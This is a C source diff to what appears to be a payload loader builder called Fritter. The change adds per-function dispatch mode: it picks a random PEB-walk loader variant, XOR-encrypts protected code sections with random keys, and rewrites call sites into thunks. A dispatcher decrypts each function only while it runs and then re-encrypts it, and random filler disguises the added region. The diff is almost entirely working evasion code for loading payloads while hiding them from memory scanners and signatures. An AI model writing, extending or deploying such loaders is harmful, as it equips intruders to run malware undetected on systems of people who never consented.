@@ -34,6 +34,12 @@
 #include "loader_peb1_exe_x64.h"
 #include "loader_peb2_exe_x64.h"
 #include "dispatch_shim_exe_x64.h"
+/* Function-granular dispatch companion tables — emitted by exe2h alongside
+   the blob headers above. Consumed only under N>1 dispatch mode. */
+#include "loader_peb1_fn_table_x64.h"
+#include "loader_peb1_ref_table_x64.h"
+#include "loader_peb2_fn_table_x64.h"
+#include "loader_peb2_ref_table_x64.h"
   
 #define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
 #define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
@@ -1316,17 +1322,32 @@ static int build_loader(PFRITTER_CONFIG c) {
     // --- Feature 6: Select random PEB walk loader variant ---
     unsigned char *loader_blob;
     uint32_t       loader_size;
+    /* Companion tables for N>1 per-function dispatch. Matched to the
+       chosen peb variant so fn_table offsets are consistent with the
+       actual loader blob's section layout. */
+    const fn_meta_t *L_FNS;
+    uint32_t         L_FN_COUNT;
+    const ref_t     *L_REFS;
+    uint32_t         L_REF_COUNT;
 
     gen_random(&rnd_byte, 1);
     switch(rnd_byte % 2) {
       case 0:
         loader_blob = LOADER_PEB1_EXE_X64;
         loader_size = sizeof(LOADER_PEB1_EXE_X64);
+        L_FNS       = LOADER_PEB1_FNS;
+        L_FN_COUNT  = LOADER_PEB1_FN_COUNT;
+        L_REFS      = LOADER_PEB1_REFS;
+        L_REF_COUNT = LOADER_PEB1_REF_COUNT;
         DPRINT("Selected PEB walk order 1 (InMemoryOrderModuleList)");
         break;
       default:
         loader_blob = LOADER_PEB2_EXE_X64;
         loader_size = sizeof(LOADER_PEB2_EXE_X64);
+        L_FNS       = LOADER_PEB2_FNS;
+        L_FN_COUNT  = LOADER_PEB2_FN_COUNT;
+        L_REFS      = LOADER_PEB2_REFS;
+        L_REF_COUNT = LOADER_PEB2_REF_COUNT;
         DPRINT("Selected PEB walk order 2 (InInitializationOrderModuleList)");
         break;
     }
@@ -1863,8 +1884,40 @@ static int build_loader(PFRITTER_CONFIG c) {
     uint32_t shim_padded_size = (shim_raw_size + 0xFFF) & ~0xFFF;  // round up to 4096
     DPRINT("Dispatch shim: %d bytes raw, %d bytes padded", shim_raw_size, shim_padded_size);
 
-    // Build combined blob: [shim (page-padded)] [loader]
-    uint32_t combined_size = shim_padded_size + loader_size;
+    // --- N>1 dispatch mode gating ---
+    // When the loader has multiple PE code sections (post-packer), engage
+    // per-function dispatch: append a dispatcher + one thunk per
+    // cross-section call to protected sections at the loader-blob tail.
+    // Single-section builds fall through to v1 whole-loader dispatch.
+    int use_ngt1 = (L_FN_COUNT > 1);
+    int is_resident[16] = {0};
+    uint32_t protected_ref_count = 0;
+    uint32_t disp_slot  = 0;
+    uint32_t thunks_size = 0;
+    if(use_ngt1) {
+      /* Residency policy: .text (FritterLoader + untagged helpers) stays
+         resident because the shim jmps to its entry directly. .main_pr
+         stays resident because MainProc is handed to CreateThread as a
+         function pointer — Windows would call encrypted bytes otherwise.
+         A wrapper stub would let us protect .main_pr; deferred. */
+      for(uint32_t i = 0; i < L_FN_COUNT; i++) {
+        if(strncmp(L_FNS[i].name, ".text",    5) == 0 ||
+           strncmp(L_FNS[i].name, ".main_pr", 8) == 0) {
+          is_resident[i] = 1;
+        }
+      }
+      for(uint32_t i = 0; i < L_REF_COUNT; i++) {
+        if(!is_resident[L_REFS[i].target_fn]) protected_ref_count++;
+      }
+      disp_slot  = DISPATCHER_MAX_SIZE;
+      thunks_size = protected_ref_count * THUNK_SIZE;
+      DPRINT("N>1 dispatch: FN_COUNT=%u REF_COUNT=%u protected_refs=%u disp_slot=%u thunks=%u",
+             L_FN_COUNT, L_REF_COUNT, protected_ref_count, disp_slot, thunks_size);
+    }
+    uint32_t tail_extra = disp_slot + thunks_size;
+
+    // Build combined blob: [shim (page-padded)] [loader] [tail_extra when N>1]
+    uint32_t combined_size = shim_padded_size + loader_size + tail_extra;
     uint8_t *combined = malloc(combined_size);
     if(combined == NULL) {
       return FRITTER_ERROR_NO_MEMORY;
@@ -1903,21 +1956,17 @@ static int build_loader(PFRITTER_CONFIG c) {
       }
     }
 
-    // Locate the fn table by marker scan and populate it.
+    // Locate the fn table by marker scan.
     //   marker  @ +0..7   (F1 7E 7A B1 F1 7E 7A B1, little-endian)
-    //   count   @ +8..11  (patched to 1 for v1 whole-loader dispatch)
+    //   count   @ +8..11  (patched below per mode)
     //   pad     @ +12..15
-    //   entry[0] @ +16..27 : {offset=0, size=loader_size, key=random, flags=0}
-    // The design supports N>1 (per-function dispatch); when the linker
-    // merge is fixed and exe2h can emit per-function boundaries, this
-    // block grows to fill multiple entries. Shim code doesn't change.
-    uint8_t fn_key = 0;
+    //   entry[i] @ +16 + i*12 : {offset, size, key, flags, pad}
+    uint32_t ft_off = 0;
     {
       static const uint8_t FN_MARKER[8] = {
         0xB1, 0x7A, 0x7E, 0xF1, 0xB1, 0x7A, 0x7E, 0xF1
       };
       int marker_found = 0;
-      uint32_t ft_off = 0;
       for(uint32_t i = 0; i + 8 <= shim_raw_size; i++) {
         if(memcmp(combined + i, FN_MARKER, 8) == 0) {
           ft_off = i;
@@ -1931,18 +1980,150 @@ static int build_loader(PFRITTER_CONFIG c) {
         return FRITTER_ERROR_NO_MEMORY;
       }
       DPRINT("fn table marker at shim+%u", ft_off);
+    }
 
-      // Generate per-output XOR key; reject zero (functional no-op).
+    // Copy loader after padded shim. XOR-encryption happens per mode below.
+    memcpy(combined + shim_padded_size, loader_blob, loader_size);
+
+    if(use_ngt1) {
+      // --- N>1 per-function dispatch mode ---
+      //
+      // Layout after this block:
+      //   combined = [shim (padded)] [loader (with rewritten disps and
+      //              XOR'd protected sections)] [dispatcher_bytes]
+      //              [thunk_0..thunk_N-1]
+      //
+      // Runtime:
+      //   1. Outer decoder unwraps combined → plaintext at rest state
+      //   2. Shim's decrypt loop skips ALL entries (none have SHIM_DECRYPT)
+      //   3. Shim calls loader_base = start of .text (RESIDENT, plaintext)
+      //   4. FritterLoader executes; cross-section calls now go to thunks
+      //   5. Each thunk: mov r10=target_off; mov r11=callee_id; jmp dispatcher
+      //   6. Dispatcher: XOR-decrypts callee slab, calls it, re-encrypts
+      //   7. FritterLoader returns to shim → shim wipes loader region
+
+      // Random-fill tail area so the dispatcher slot's unused suffix and
+      // any post-thunk padding look like the rest of the encoded region.
+      if(tail_extra > 0) {
+        gen_random(combined + shim_padded_size + loader_size, tail_extra);
+      }
+
+      // Emit dispatcher at start of tail
+      uint32_t disp_off_in_blob   = shim_padded_size + loader_size;
+      uint32_t loader_off_in_blob = shim_padded_size;
+      uint32_t actual_disp_size = emit_dispatcher(combined + disp_off_in_blob,
+                                                   disp_off_in_blob,
+                                                   loader_off_in_blob,
+                                                   ft_off);
+      if(actual_disp_size > DISPATCHER_MAX_SIZE) {
+        DPRINT("ERROR: dispatcher emitted %u bytes > slot %u",
+               actual_disp_size, DISPATCHER_MAX_SIZE);
+        free(combined);
+        return FRITTER_ERROR_NO_MEMORY;
+      }
+      DPRINT("Dispatcher: %u bytes at blob+%u (slot %u)",
+             actual_disp_size, disp_off_in_blob, DISPATCHER_MAX_SIZE);
+
+      // Emit thunks + rewrite loader disps for each protected-target ref.
+      // Thunks live at blob+shim_padded+loader_size+DISPATCHER_MAX_SIZE+i*THUNK_SIZE
+      // (so thunk_i's loader-relative offset is loader_size+DISPATCHER_MAX_SIZE+i*THUNK_SIZE).
+      uint32_t thunk_i = 0;
+      for(uint32_t r = 0; r < L_REF_COUNT; r++) {
+        if(is_resident[L_REFS[r].target_fn]) continue;
+
+        // Reconstruct target_blob_off from the packer's disp32 currently
+        // in the loader blob (fritter has this from exe2h emission already,
+        // but reading the disp keeps ref_t compact).
+        int32_t current_disp;
+        memcpy(&current_disp,
+               combined + shim_padded_size + L_REFS[r].src_blob_off + L_REFS[r].disp_offset,
+               4);
+        uint32_t target_blob_off = (uint32_t)((int32_t)L_REFS[r].src_blob_off
+                                              + L_REFS[r].inst_length
+                                              + current_disp);
+
+        uint32_t thunk_off_in_loader = loader_size + DISPATCHER_MAX_SIZE
+                                       + thunk_i * THUNK_SIZE;
+        uint32_t thunk_off_in_blob   = shim_padded_size + thunk_off_in_loader;
+
+        // Dispatcher is at disp_off_in_blob. rel32 from end-of-jmp
+        // (thunk_off_in_blob + THUNK_SIZE) to dispatcher entry.
+        int32_t dispatcher_rel = (int32_t)disp_off_in_blob
+                                 - (int32_t)(thunk_off_in_blob + THUNK_SIZE);
+
+        emit_thunk(combined + thunk_off_in_blob,
+                   target_blob_off,
+                   L_REFS[r].target_fn,
+                   dispatcher_rel);
+
+        // Rewrite the loader's disp32 so the original CALL/JMP now targets
+        // this thunk. disp is loader-relative because both src and thunk
+        // are in the loader region (post shim, pre outer-encode).
+        int32_t new_disp = (int32_t)thunk_off_in_loader
+                           - (int32_t)((int32_t)L_REFS[r].src_blob_off + L_REFS[r].inst_length);
+        memcpy(combined + shim_padded_size + L_REFS[r].src_blob_off + L_REFS[r].disp_offset,
+               &new_disp, 4);
+
+        thunk_i++;
+      }
+      if(thunk_i != protected_ref_count) {
+        DPRINT("ERROR: emitted %u thunks, expected %u", thunk_i, protected_ref_count);
+        free(combined);
+        return FRITTER_ERROR_NO_MEMORY;
+      }
+      DPRINT("Emitted %u thunks; rewrote %u disps", thunk_i, thunk_i);
+
+      // Populate multi-entry fn_table + XOR-encrypt each protected section.
+      uint32_t new_count = L_FN_COUNT + 1;
+      memcpy(combined + ft_off + 8, &new_count, 4);
+      for(uint32_t i = 0; i < L_FN_COUNT; i++) {
+        uint32_t e_off = L_FNS[i].offset;
+        uint32_t e_sz  = L_FNS[i].size;
+        uint8_t  e_key = 0;
+        uint8_t  e_flags;
+        if(is_resident[i]) {
+          e_flags = 0x01;  /* FN_FLAG_RESIDENT */
+        } else {
+          do { gen_random(&e_key, 1); } while(e_key == 0);
+          e_flags = 0x00;  /* dispatcher-managed */
+          for(uint32_t k = 0; k < e_sz; k++) {
+            combined[shim_padded_size + e_off + k] ^= e_key;
+          }
+        }
+        uint8_t *entry = combined + ft_off + 16 + i * 12;
+        memcpy(entry + 0, &e_off, 4);
+        memcpy(entry + 4, &e_sz,  4);
+        entry[8]  = e_key;
+        entry[9]  = e_flags;
+        entry[10] = 0x00;
+        entry[11] = 0x00;
+        DPRINT("  fn[%u] name=%-9.*s off=0x%05x size=0x%04x key=0x%02x flags=0x%02x",
+               i, 8, L_FNS[i].name, e_off, e_sz, e_key, e_flags);
+      }
+      // Trailing entry covers the dispatcher + thunks region as RESIDENT
+      // so the shim's (no-op) decrypt loop skips it and the dispatcher
+      // doesn't try to crypt it either.
+      uint32_t tail_e_off = loader_size;
+      uint32_t tail_e_sz  = DISPATCHER_MAX_SIZE + thunks_size;
+      uint8_t *tail_entry = combined + ft_off + 16 + L_FN_COUNT * 12;
+      memcpy(tail_entry + 0, &tail_e_off, 4);
+      memcpy(tail_entry + 4, &tail_e_sz,  4);
+      tail_entry[8]  = 0;
+      tail_entry[9]  = 0x01;  /* RESIDENT */
+      tail_entry[10] = 0;
+      tail_entry[11] = 0;
+      DPRINT("  fn[%u] tail (dispatch+thunks) off=0x%05x size=0x%04x RESIDENT",
+             L_FN_COUNT, tail_e_off, tail_e_sz);
+      DPRINT("N>1 fn_table populated: count=%u", new_count);
+
+    } else {
+      // --- v1 whole-loader dispatch mode ---
+      // Single fn_table entry covers the loader; shim auto-decrypts.
+      uint8_t fn_key = 0;
       do { gen_random(&fn_key, 1); } while(fn_key == 0);
 
-      // fn_count = 1
       uint32_t one = 1;
       memcpy(combined + ft_off + 8, &one, 4);
-      // entry[0]: offset=0, size=loader_size, key=fn_key,
-      //          flags=SHIM_DECRYPT (0x2) — shim auto-decrypts the whole
-      //          loader region at entry (v1 whole-loader model). Under
-      //          forthcoming N>1 mode, protected entries have flags=0 and
-      //          the loader-tail dispatcher owns their crypt cycle.
       uint32_t e_off = 0, e_sz = loader_size;
       uint8_t  e_flags = 0x02;  /* FN_FLAG_SHIM_DECRYPT */
       memcpy(combined + ft_off + 16 + 0, &e_off, 4);
@@ -1953,16 +2134,14 @@ static int build_loader(PFRITTER_CONFIG c) {
       combined[ft_off + 16 + 11] = 0x00;
       DPRINT("Patched fn table: count=1 entry[0]={offset=0 size=%u key=0x%02X flags=0x%02X}",
              loader_size, fn_key, e_flags);
-    }
 
-    // Copy loader after padded shim, then XOR-encrypt the loader
-    // region in place with the per-fn key. Shim untouched.
-    memcpy(combined + shim_padded_size, loader_blob, loader_size);
-    for(uint32_t i = 0; i < loader_size; i++) {
-      combined[shim_padded_size + i] ^= fn_key;
+      // XOR-encrypt the whole loader region with the per-fn key.
+      for(uint32_t i = 0; i < loader_size; i++) {
+        combined[shim_padded_size + i] ^= fn_key;
+      }
+      DPRINT("XOR-encrypted loader region (%u bytes) with fn key 0x%02X",
+             loader_size, fn_key);
     }
-    DPRINT("XOR-encrypted loader region (%u bytes) with fn key 0x%02X",
-           loader_size, fn_key);
 
     // Outer decoder wraps the WHOLE combined blob (shim + fn-encrypted loader).
     uint8_t *encoded = malloc(combined_size);
